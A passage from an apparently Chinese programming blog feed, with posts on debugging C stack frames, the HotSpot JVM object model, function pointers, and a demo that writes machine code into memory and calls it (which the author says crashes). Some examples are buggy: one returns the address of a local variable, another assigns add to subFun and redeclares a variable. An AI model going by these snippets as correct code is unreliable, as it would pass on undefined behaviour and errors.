    <content type="html"><![CDATA[<h3 id="测试程序"><a href="#测试程序" class="headerlink" title="测试程序"></a>测试程序</h3><pre><code class="hljs c"><span class="hljs-comment">/*</span><span class="hljs-comment"> * AddTest.c</span><span class="hljs-comment"> *</span><span class="hljs-comment"> *  Created on: 2019年10月13日</span><span class="hljs-comment"> *      Author: appweb</span><span class="hljs-comment"> */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span> </span>&#123;<span class="hljs-keyword">int</span> c = addAgain(a, b);<span class="hljs-keyword">return</span> c;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">addAgain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span> </span>&#123;<span class="hljs-keyword">int</span> c = a + b;<span class="hljs-keyword">return</span> c;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span> </span>&#123;<span class="hljs-keyword">int</span> c = a - b;<span class="hljs-keyword">return</span> c;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<span class="hljs-keyword">int</span> s = add(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>);<span class="hljs-keyword">int</span> d = sub(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>makefile  </p><pre><code class="hljs shell">PROJECT_ROOT = $(dir $(abspath $(lastword $(MAKEFILE_LIST))))OBJS = AddTest.o<span class="hljs-meta">#</span><span class="bash"> 如果在命令行直接执行make 需要<span class="hljs-built_in">export</span> BUILD_MODE=debug 或者run</span>ifeq ($(BUILD_MODE),debug)CFLAGS += -gelse ifeq ($(BUILD_MODE),run)CFLAGS += -O2else<span class="hljs-meta">$</span><span class="bash">(error Build mode $(BUILD_MODE) not supported by this Makefile)</span>endifall:InvokeFunction<span class="hljs-meta">#</span><span class="bash"> <span class="hljs-variable">$@</span> 表示规则中的目标文件集。在模式规则中，如果有多个目标，那么，<span class="hljs-string">"<span class="hljs-variable">$@</span>"</span>就是匹配于目标中模式定义的集合。</span><span class="hljs-meta">#</span><span class="bash"> $^ 所有的依赖目标的集合。以空格分隔。如果在依赖目标中有多个重复的，那个这个变量会去除重复的依赖目标，只保留一份。</span><span class="hljs-meta">#</span><span class="bash"> $&lt; 依赖目标中的第一个目标名字。如果依赖目标是以模式（即<span class="hljs-string">"%"</span>）定义的，那么<span class="hljs-string">"$&lt;"</span>将是符合模式的一系列的文件集。注意，其是一个一个取出来的。</span><span class="hljs-meta">#</span><span class="bash"> $? 所有比目标新的依赖目标的集合。以空格分隔。</span><span class="hljs-meta">#</span><span class="bash"> 输出变量可以使用如下办法</span><span class="hljs-meta">$</span><span class="bash">(info $<span class="hljs-variable">$OBJS</span> is [<span class="hljs-variable">$&#123;OBJS&#125;</span>])</span><span class="hljs-meta">$</span><span class="bash">(info $$(CXX) is [$(CXX)])</span><span class="hljs-meta">$</span><span class="bash">(info $$(PROJECT_ROOT) is [$(PROJECT_ROOT)])</span>AddTest:$(OBJS)<span class="hljs-meta">$</span><span class="bash">(CXX) -o <span class="hljs-variable">$@</span> $^</span><span class="hljs-meta">%</span><span class="bash">.o:$(PROJECT_ROOT)src/%.c</span><span class="hljs-meta">$</span><span class="bash">(CXX) -c $(CFLAGS) $(CXXFLAGS) $(CPPFLAGS) -o <span class="hljs-variable">$@</span> $&lt;</span>clean:rm -fr AddTest $(OBJS)</code></pre><p>一如既往的使用CDT，寄存器监视(我需要观察的几个)、内存监视 、反编译的汇编指令窗口弄在一起，调试起来真是方便<br><a href="https://files.cnblogs.com/files/simoncook/c-basic-simple-fun-invoke.zip" target="_blank" rel="noopener">打包好的工程</a>   </p><h3 id="先编译下然后开始调试并观察"><a href="#先编译下然后开始调试并观察" class="headerlink" title="先编译下然后开始调试并观察"></a>先编译下然后开始调试并观察</h3><p><img src="/img/opensource-code-study/127449-20191013213124878-1594537876.png" srcset="/img/loading.gif" alt=""><br>开始调试  </p><p><img src="/img/opensource-code-study/127449-20191013213623625-1695838867.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013213434962-952143825.png" srcset="/img/loading.gif" alt=""><br>添加寄存器监视  </p><p><img src="/img/opensource-code-study/127449-20191013213112141-1657908421.png" srcset="/img/loading.gif" alt=""><br>添加内存监视  </p><p><img src="/img/opensource-code-study/127449-20191013212704068-563412231.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013213955846-572615224.png" srcset="/img/loading.gif" alt="">  </p><p>启用指令单步调试  </p><p><img src="/img/opensource-code-study/127449-20191013212710084-721700713.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212713577-1284264556.png" srcset="/img/loading.gif" alt="">  </p><p><code>rsp</code>是<code>栈顶</code>，<code>rbp</code>是<code>栈底</code>，大小及栈分配的生长方向如下：  </p><pre><code class="hljs html">                     栈分配生长方向     <span class="hljs-tag">&lt;<span class="hljs-name">-------------------------------------+</span></span><span class="hljs-tag">                      <span class="hljs-attr">rsp</span> 栈顶           <span class="hljs-attr">rbp</span> 栈底</span><span class="hljs-tag">     +<span class="hljs-attr">------------------</span>+<span class="hljs-attr">------------------</span>+</span><span class="hljs-tag">     |                  |                  |</span><span class="hljs-tag">     |                  |                  |</span><span class="hljs-tag">     +<span class="hljs-attr">------------------</span>+<span class="hljs-attr">------------------</span>+</span><span class="hljs-tag">内存低位地址                                 内存高位地址</span></code></pre><p>现在rsp是0xfffffffd750，执行完下图的  </p><pre><code class="hljs c"><span class="hljs-number">00000000000004195598</span>:   mov     %rsp,%rbp<span class="hljs-number">00000000000004195601</span>:   sub     $<span class="hljs-number">0x10</span>,%rsp</code></pre><p>这两条汇编指令后，rbp是0xfffffffd750，rsp是0xfffffffd740，这就是<span style="color:red;font-weight:bold;"> 函数栈帧空间分配</span>   </p><p><img src="/img/opensource-code-study/127449-20191013212716921-2118025943.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212720068-101932415.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212723085-2109828896.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212726478-683302030.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212729809-253642425.png" srcset="/img/loading.gif" alt="">   </p><p>在执行完callq与push指令之后，栈顶再往前的内存(就是紧靠着栈顶比栈顶还小的内存)会发生变化，看图中内存监视器红色部分，按有些书上说法此处是保存了rip和rbp，但是我没能太理解，看数值不怎么能对上    </p><p><img src="/img/opensource-code-study/127449-20191013212732787-1365119217.png" srcset="/img/loading.gif" alt="">  </p><p>注意看 进入addAagin方法后，并不是像某些书上说的会分配函数栈帧控空间，我猜测是编译器做了优化吧，因为addAagin方法不再调用其他方法了。<br>看了R大的文章，这种函数应该是 叶函数，叶函数是不调用别的函数的函数。  </p><p><img src="/img/opensource-code-study/127449-20191013212735696-2080827939.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212738294-297042460.png" srcset="/img/loading.gif" alt="">  </p><pre><code class="hljs c"><span class="hljs-number">00000000000004195547</span>:   mov     %edi,<span class="hljs-number">-0x14</span>(%rbp)<span class="hljs-number">00000000000004195550</span>:   mov     %esi,<span class="hljs-number">-0x18</span>(%rbp)</code></pre><p>看上图，从edi和esi集群器向 相对于rbp(栈底)偏移(负偏移)的内存传数据，这个称之为<code>压栈</code><br>不过有些书上讲的是 向 相对rsp(栈顶)偏移(正偏移)的内存传数据，我理解成一个意思，不过是内存定位的方式不同罢了    </p><p><img src="/img/opensource-code-study/127449-20191013212740773-784610097.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212743543-949745400.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212747088-1827706771.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212750708-1730251809.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212755236-1810253543.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212758293-961429290.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212801721-1506741542.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212805133-268749872.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212809541-75520271.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212812801-2098455477.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212815684-1347401812.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212818975-765097197.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212823492-1799686045.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212826870-632837344.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212836164-1438987603.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212839258-1112617573.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212842668-1446656259.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212846984-634504240.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212907697-1134863.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212911706-1944898044.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212918584-574474344.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212923081-1064945178.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20191013212927604-1301186841.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>hotspot源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JVM中对象模型及相应名词概念</title>
    <link href="/2020/04/22/hotspot-object-model/"/>
    <url>/2020/04/22/hotspot-object-model/</url>
    
    <content type="html"><![CDATA[<h3 id="JVM中对象模型及相应名词概念"><a href="#JVM中对象模型及相应名词概念" class="headerlink" title="JVM中对象模型及相应名词概念"></a>JVM中对象模型及相应名词概念</h3><p>java对象在jvm中的模型是OOP-Klass 模型；</p><h4 id="klass"><a href="#klass" class="headerlink" title="klass"></a>klass</h4><p>klass对应元数据，包括常量池、字段、方法等。是在加载class阶段创建instanceKlass。存放在方法区。</p><h4 id="oop"><a href="#oop" class="headerlink" title="oop"></a>oop</h4><p>oop对应java中的实例。<br>oop是指向oopDesc的指针。  </p><pre><code class="hljs cpp"><span class="hljs-comment">// share/vm/oops/oopsHierarchy.hpp</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">oopDesc</span>*                            <span class="hljs-title">oop</span>;</span> <span class="hljs-comment">// SimonNote: oop是指向oopDesc的指针</span></code></pre><h4 id="oopDesc"><a href="#oopDesc" class="headerlink" title="oopDesc"></a>oopDesc</h4><p>instanceOOpDesc只包含数据信息，主要由以下部分组成：  </p><ol><li>对象头，也叫markword。主要存储对象运行时记录信息，如hashcode，GC分代年龄，锁状态标志，线程id，时间戳等  </li><li>元数据指针，这里指指向方法区的instanceKlass实例</li><li>实例数据，(我的理解 对其获取与存取的方式是按对象头为基址做相对偏移后操作的，可以参见oop.inline.hpp的obj_field_addr方法)</li><li>如果是数组对象，还多一个数组长度</li></ol><p>oopDesc的结构图示：<br><img src="/img/opensource-code-study/2019-06-27-175457.png" srcset="/img/loading.gif" alt=""><br>先是头部，头部后面接着数据，数据后面接着对其填充；头部包含mark和元数。  </p><p>oop是普通对象指针之意，对象指针好理解，但是最前面那个o是普通的意思，怎么理解这个普通？参见<a href="https://book.douban.com/annotation/31468264/" target="_blank" rel="noopener">R大解释</a>  </p><blockquote><p>为什么把GC托管指针叫做oop？对象指针不就是指针么，为啥还要加一个“普通”来修饰？<br>这有个有趣的历史原因。对Smalltalk与HotSpot VM的渊源有所了解的话就会知道。在Strongtalk VM的文档里有详细描述：<a href="https://code.google.com/p/strongtalk/wiki/VMTypesForSmalltalkObjects" target="_blank" rel="noopener">https://code.google.com/p/strongtalk/wiki/VMTypesForSmalltalkObjects</a><br>关键点在于在Smalltalk的对象由GC来管理，而其许多实现里都会用所谓“直接对象”的方式来实现一些简单的值类型对象，例如SmallInteger。所谓“直接对象”（immediate object）就是并不在GC堆上分配对象实例，而是直接将实例内容存在对象指针里的对象。这样的指针也叫做“带标记的指针”（tagged pointer）。<br>于是在这种环境中，每当我们拿到一个对象指针时，都得先问它：你是一个直接对象还是一个真的指针？如果是真的指针，它就是一个“普通”的对象指针了。这样对象指针就有了“普通”与“不普通”之分。<br>这个语境中的oop也被认为是“object oriented pointer”的缩写。无论是“ordinary object pointer”还是“object oriented pointer”，其实要说的事情是一模一样的。以前术语特别混乱，oop到底最最初是谁的缩写就不大好考证了。<br>关于tagged pointer，HLLVM群组的一个老帖也有讨论：<a href="http://hllvm.group.iteye.com/group/topic/17840#post-126408" target="_blank" rel="noopener">http://hllvm.group.iteye.com/group/topic/17840#post-126408</a></p></blockquote><h4 id="之间关系"><a href="#之间关系" class="headerlink" title="之间关系"></a>之间关系</h4><p>举例：<br>Person示例—- —&gt; ——- Person的instanceKlass——- ——- –&gt;———- ——- Person的class<br>instanceOopDesc – ——JDK8在metaspace，JDK6 7 在方法区 ——— ——- JDK7 8 在堆中，JDK6在方法区</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>hotspot源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>函数指针与指针函数，直接向内存区域写入操作码并转成函数指针并调用</title>
    <link href="/2020/04/22/c-cpp-point-function/"/>
    <url>/2020/04/22/c-cpp-point-function/</url>
    
    <content type="html"><![CDATA[<h2 id="函数指针与指针函数"><a href="#函数指针与指针函数" class="headerlink" title="函数指针与指针函数"></a>函数指针与指针函数</h2><p>阅读hotspot的代码，需要先弄清楚这两个很容易混淆的概念。<br>最近我想到一个办法去区分折扣两个，就是在中间加个“的”：  </p><ul><li>函数的<code>指针</code></li><li>指针的<code>函数</code>  </li></ul><p>这样就很容易区分了。  </p><ul><li>函数指针，实际上是指针，是指向函数的指针  </li><li>指针函数，实际上函数，是指返回指针的函数  </li></ul><p>其实在C语言中，指针数组和数组指针也是一样的区分办法。  加个“的”便可以解决。<br>为什么会有这样的问题？老外怎么理解这个事情？我得回去翻翻K&amp;R的那本Ｃ的英文教材。TODO。  </p><h3 id="指针函数"><a href="#指针函数" class="headerlink" title="指针函数"></a>指针函数</h3><p>是指返回指针的函数，比如：</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> *<span class="hljs-title">fun</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span> </span>&#123;    <span class="hljs-keyword">int</span> c = a + b;    <span class="hljs-keyword">return</span> &amp;c; <span class="hljs-comment">// 返回一个指针</span>&#125;</code></pre><h3 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h3><p>是指指向函数的指针</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-keyword">int</span> (* fun)(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b); <span class="hljs-comment">// fun 就是指向函数的指针变量 </span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span> </span>&#123;    <span class="hljs-keyword">int</span> c = a + b;    <span class="hljs-keyword">return</span> c;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    fun = add;    <span class="hljs-keyword">int</span> result = fun(<span class="hljs-number">100</span>, <span class="hljs-number">200</span>);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"result=%d\n"</span>, result);&#125;</code></pre><h3 id="函数指针定义成类型"><a href="#函数指针定义成类型" class="headerlink" title="函数指针定义成类型"></a>函数指针定义成类型</h3><p>还可以结合类型声明将函数指针定义成类型  </p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-comment">// 定义一个 返回值是int 参数是两个int的函数指针</span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(* FunRefTypeTwoIntArgs)</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span>; <span class="hljs-comment">// 将上面的函数指针变量 演化为类型 FunRefTypeTwoIntArgs 就是个类型 这样就好用多了</span>FunRefTypeTwoIntArgs addFun;FunRefTypeTwoIntArgs subFun;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span> </span>&#123;    <span class="hljs-keyword">int</span> c = a + b;    <span class="hljs-keyword">return</span> c;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span> </span>&#123;    <span class="hljs-keyword">int</span> c = a - b;    <span class="hljs-keyword">return</span> c;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    addFun = add;    <span class="hljs-keyword">int</span> result = addFun(<span class="hljs-number">100</span>, <span class="hljs-number">200</span>);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"result=%d\n"</span>, result);        subFun = add;    <span class="hljs-keyword">int</span> result = subFun(<span class="hljs-number">500</span>, <span class="hljs-number">100</span>); <span class="hljs-comment">// 也可以写成  result = (*subFun)(500, 100);</span>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"result=%d\n"</span>, result);&#125;</code></pre><p>这就有点类似java中接口的样子了。  </p><h3 id="指针函数返回函数指针类型，结合hotspot中实际例子"><a href="#指针函数返回函数指针类型，结合hotspot中实际例子" class="headerlink" title="指针函数返回函数指针类型，结合hotspot中实际例子"></a>指针函数返回函数指针类型，结合hotspot中实际例子</h3><p>先是类型定义结合函数指针定义一个CallStub类型，该类型是 一个 指向函数的指针  </p><pre><code class="hljs cpp"><span class="hljs-comment">// share/vm/runtime/stubRoutines.hpp</span>  <span class="hljs-comment">// Calls to Java SimonNote: 函数指针结合typedef类型定义  最终调用是在 javaCalls中的call_helper()</span>  <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span> <span class="hljs-params">(*CallStub)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    address   link,</span></span><span class="hljs-function"><span class="hljs-params">    <span class="hljs-keyword">intptr_t</span>* result,</span></span><span class="hljs-function"><span class="hljs-params">    BasicType result_type,</span></span><span class="hljs-function"><span class="hljs-params">    Method* method,</span></span><span class="hljs-function"><span class="hljs-params">    address   entry_point,</span></span><span class="hljs-function"><span class="hljs-params">    <span class="hljs-keyword">intptr_t</span>* parameters,</span></span><span class="hljs-function"><span class="hljs-params">    <span class="hljs-keyword">int</span>       size_of_parameters,</span></span><span class="hljs-function"><span class="hljs-params">    TRAPS</span></span><span class="hljs-function"><span class="hljs-params">  )</span></span>;</code></pre><p>再定义一个返回函数指针的函数，拆开讲：本质是一个函数，是一个返回函数指针的函数，是一个返回 指向函数的指针的 函数，此处还涉及将内存地址直接转成函数指针(指向函数的指针)  </p><pre><code class="hljs cpp"><span class="hljs-comment">// share/vm/runtime/stubRoutines.hpp</span>  <span class="hljs-comment">// Calls to Java SimonNote: 将内存地址 转换成函数指针 CAST_TO_FN_PTR   call_stub 就是一个××返回函数指针×× 的 指针函数  ((CallStub)(castable_address(_call_stub_entry)))</span>  <span class="hljs-function"><span class="hljs-keyword">static</span> CallStub <span class="hljs-title">call_stub</span><span class="hljs-params">()</span>                              </span>&#123; <span class="hljs-keyword">return</span> CAST_TO_FN_PTR(CallStub, _call_stub_entry); &#125;</code></pre><p>调用上面定义的  </p><pre><code class="hljs cpp"><span class="hljs-comment">// share/vm/runtime/javaCalls.cpp</span><span class="hljs-comment">// 发起调用的地方</span>      StubRoutines::call_stub()(        (address)&amp;link,        <span class="hljs-comment">// (intptr_t*)&amp;(result-&gt;_value), // see NOTE above (compiler problem)</span>        result_val_address,          <span class="hljs-comment">// see NOTE above (compiler problem)</span>        result_type,        method(),        entry_point,        args-&gt;parameters(),        args-&gt;size_of_parameters(),        CHECK      );</code></pre><h3 id="直接在内存中写入机器码转成函数指针并调用的demo"><a href="#直接在内存中写入机器码转成函数指针并调用的demo" class="headerlink" title="直接在内存中写入机器码转成函数指针并调用的demo"></a>直接在内存中写入机器码转成函数指针并调用的demo</h3><p>下面这段 代码 还有遗留问题 还是没能跑成功，至于原因，我目前还没有答案。  </p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(* addFun)</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">addWrap</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span> </span>&#123;<span class="hljs-keyword">int</span> c = add(a, b);<span class="hljs-keyword">return</span> c;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span> </span>&#123;<span class="hljs-keyword">return</span> a + b;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<span class="hljs-keyword">int</span> codeSize = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>) * <span class="hljs-number">42</span>;<span class="hljs-keyword">char</span>* pCode = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(codeSize);<span class="hljs-keyword">char</span>* pGen = pCode;mprotect(pCode, codeSize, PROT_READ | PROT_WRITE | PROT_EXEC); <span class="hljs-comment">// 加了这一行也是core。</span>*pGen++ = <span class="hljs-number">0x55</span>;  <span class="hljs-comment">// 0x00000000004004fd &lt;+0&gt;:55push   %rbp</span>*pGen++ = <span class="hljs-number">0x48</span>; *pGen++ = <span class="hljs-number">0x89</span>; *pGen++ = <span class="hljs-number">0xe5</span>; <span class="hljs-comment">// 0x00000000004004fe &lt;+1&gt;:48 89 e5mov    %rsp,%rbp</span>*pGen++ = <span class="hljs-number">0x48</span>; *pGen++ = <span class="hljs-number">0x83</span>; *pGen++ = <span class="hljs-number">0xec</span>; *pGen++ = <span class="hljs-number">0x20</span>; <span class="hljs-comment">// 0x0000000000400501 &lt;+4&gt;:48 83 ec 20sub    $0x20,%rsp</span>*pGen++ = <span class="hljs-number">0x89</span>; *pGen++ = <span class="hljs-number">0x7d</span>; *pGen++ = <span class="hljs-number">0xec</span>; <span class="hljs-comment">// 0x0000000000400505 &lt;+8&gt;:89 7d ecmov    %edi,-0x14(%rbp)</span>*pGen++ = <span class="hljs-number">0x89</span>; *pGen++ = <span class="hljs-number">0x75</span>; *pGen++ = <span class="hljs-number">0xe8</span>; <span class="hljs-comment">// 0x0000000000400508 &lt;+11&gt;:89 75 e8mov    %esi,-0x18(%rbp)</span>*pGen++ = <span class="hljs-number">0x8b</span>; *pGen++ = <span class="hljs-number">0x55</span>; *pGen++ = <span class="hljs-number">0xe8</span>; <span class="hljs-comment">//   0x000000000040050b &lt;+14&gt;:8b 55 e8mov    -0x18(%rbp),%edx</span>*pGen++ = <span class="hljs-number">0x8b</span>; *pGen++ = <span class="hljs-number">0x45</span>; *pGen++ = <span class="hljs-number">0xec</span>; <span class="hljs-comment">//   0x000000000040050e &lt;+17&gt;:8b 45 ecmov    -0x14(%rbp),%eax</span>*pGen++ = <span class="hljs-number">0x89</span>; *pGen++ = <span class="hljs-number">0xd6</span>; <span class="hljs-comment">//   0x0000000000400511 &lt;+20&gt;:89 d6mov    %edx,%esi</span>*pGen++ = <span class="hljs-number">0x89</span>; *pGen++ = <span class="hljs-number">0xc7</span>; <span class="hljs-comment">//   0x0000000000400513 &lt;+22&gt;:89 c7mov    %eax,%edi</span>*pGen++ = <span class="hljs-number">0xb8</span>; *pGen++ = <span class="hljs-number">0x00</span>; *pGen++ = <span class="hljs-number">0x00</span>; *pGen++ = <span class="hljs-number">0x00</span>; *pGen++ = <span class="hljs-number">0x00</span>; <span class="hljs-comment">//   0x0000000000400515 &lt;+24&gt;:b8 00 00 00 00mov    $0x0,%eax</span>*pGen++ = <span class="hljs-number">0xe8</span>; *pGen++ = <span class="hljs-number">0x08</span>; *pGen++ = <span class="hljs-number">0x00</span>; *pGen++ = <span class="hljs-number">0x00</span>; *pGen++ = <span class="hljs-number">0x00</span>; <span class="hljs-comment">//   0x000000000040051a &lt;+29&gt;:e8 08 00 00 00callq  0x400527 &lt;add&gt;</span>*pGen++ = <span class="hljs-number">0x89</span>; *pGen++ = <span class="hljs-number">0x45</span>; *pGen++ = <span class="hljs-number">0xfc</span>; <span class="hljs-comment">//   0x000000000040051f &lt;+34&gt;:89 45 fcmov    %eax,-0x4(%rbp)</span>*pGen++ = <span class="hljs-number">0x8b</span>; *pGen++ = <span class="hljs-number">0x45</span>; *pGen++ = <span class="hljs-number">0xfc</span>; <span class="hljs-comment">//   0x0000000000400522 &lt;+37&gt;:8b 45 fcmov    -0x4(%rbp),%eax</span>*pGen++ = <span class="hljs-number">0xc9</span>; <span class="hljs-comment">//   0x0000000000400525 &lt;+40&gt;:c9leaveq</span>*pGen++ = <span class="hljs-number">0xc3</span>; <span class="hljs-comment">//   0x0000000000400526 &lt;+41&gt;:c3retq</span><span class="hljs-comment">//addFun af = addWrap;</span>addFun af = (addFun)pCode; <span class="hljs-comment">// 如果我把这行注释掉  上一行行去掉注释  用上一行的方式 就没问题 但是反之 跑起来就会core core在下一行</span><span class="hljs-keyword">int</span> r = af(<span class="hljs-number">5</span>, <span class="hljs-number">15</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, r);<span class="hljs-built_in">free</span>(pCode);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>有人说用mmap才可以解决core的问题<br>我有空试试<br><img src="/img/opensource-code-study/127449-20191106230433749-467754158.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>hotspot源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>指针转换</title>
    <link href="/2020/04/22/c-cpp-point-convert/"/>
    <url>/2020/04/22/c-cpp-point-convert/</url>
    
    <content type="html"><![CDATA[<h3 id="指针转换"><a href="#指针转换" class="headerlink" title="指针转换"></a>指针转换</h3><p>今天在看hotspot代码时，有处没能看明白，于是请教青老师，给出了解答是<code>指针转换</code>的语法</p><pre><code class="hljs cpp">share/vm/memory/defNewGeneration.cpp DefNewGeneration::collectshare/vm/memory/genOopClosures.<span class="hljs-keyword">inline</span>.hpp FastScanClosure::do_oop_workshare/vm/memory/defNewGeneration.cpp DefNewGeneration::copy_to_survivor_spaceshare/vm/oops/oop.<span class="hljs-keyword">inline</span>.hpp forward_to::forward_tomarkOop.hppsrc/share/vm/oops/markOop.hpp  <span class="hljs-comment">// Prepare address of oop for placement into mark</span>  <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-keyword">static</span> markOop <span class="hljs-title">encode_pointer_as_mark</span><span class="hljs-params">(<span class="hljs-keyword">void</span>* p)</span> </span>&#123; <span class="hljs-keyword">return</span> markOop(p)-&gt;set_marked(); &#125;</code></pre><p>就是上面markOop(p) 这个写法当时没看懂，他不是什么方法调用，也不是什么构造函数，而是指针转换。<br>青老师给我写了一小段demo如下：</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span 